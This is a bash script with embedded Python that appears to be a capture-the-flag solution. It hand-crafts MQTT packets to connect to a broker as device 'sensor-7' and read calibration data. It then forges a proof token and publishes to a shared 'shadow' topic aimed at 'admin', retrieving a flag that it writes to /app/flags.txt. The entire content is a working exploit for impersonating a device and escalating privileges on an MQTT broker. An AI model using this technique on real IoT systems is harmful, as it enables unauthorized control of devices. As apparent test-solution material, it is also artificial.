#!/usr/bin/env bash
set -euo pipefail
python3 - <<'PY'

import json, socket, struct
def enc_len(n):
    out=bytearray()
    while True:
        b=n%128; n//=128
        if n: b|=128
        out.append(b)
        if not n:return bytes(out)
def s(v):
    b=v.encode(); return struct.pack("!H",len(b))+b
def pkt(k,p=b"",f=0): return bytes([(k<<4)|f])+enc_len(len(p))+p
def recv(sock):
    first=sock.recv(1)[0]; mult=1;n=0
    while True:
        b=sock.recv(1)[0]; n+=(b&127)*mult
        if not b&128:break
        mult*=128
    data=b""
    while len(data)<n:data+=sock.recv(n-len(data))
    return first>>4,first&15,data
def text(data,p=0):
    n=struct.unpack_from("!H",data,p)[0];p+=2;return data[p:p+n].decode(),p+n

import hashlib, time
from pathlib import Path
for attempt in range(40):
    try: sock=socket.create_connection(("target",1883),3); break
    except OSError:
        if attempt==39: raise
        time.sleep(.25)
connect=s("MQTT")+bytes([4,2])+struct.pack("!H",30)+s("sensor-7")
sock.sendall(pkt(1,connect)); recv(sock)
sock.sendall(pkt(8,struct.pack("!H",1)+s("calibration/+")+b"\x00",2)); recv(sock)
_,_,data=recv(sock); topic,pos=text(data); calibration=json.loads(data[pos:])
proof=hashlib.sha256(f"{calibration['nonce']}:{calibration['mask']}:admin-shadow".encode()).hexdigest()[:16]
sock.sendall(pkt(8,struct.pack("!H",2)+s("devices/sensor-7/result")+b"\x00",2)); recv(sock)
payload=json.dumps({"target":"admin","seq":0,"proof":proof},separators=(",",":")).encode()
sock.sendall(pkt(3,s("$share/ops/devices/sensor-7/shadow")+payload,1))
_,_,data=recv(sock); topic,pos=text(data); result=json.loads(data[pos:])
Path("/app/flags.txt").write_text(result["flag"]+"\n")
Path("/app/evidence.json").write_text(json.dumps(result["receipt"],indent=2,sort_keys=True)+"\n")
PY
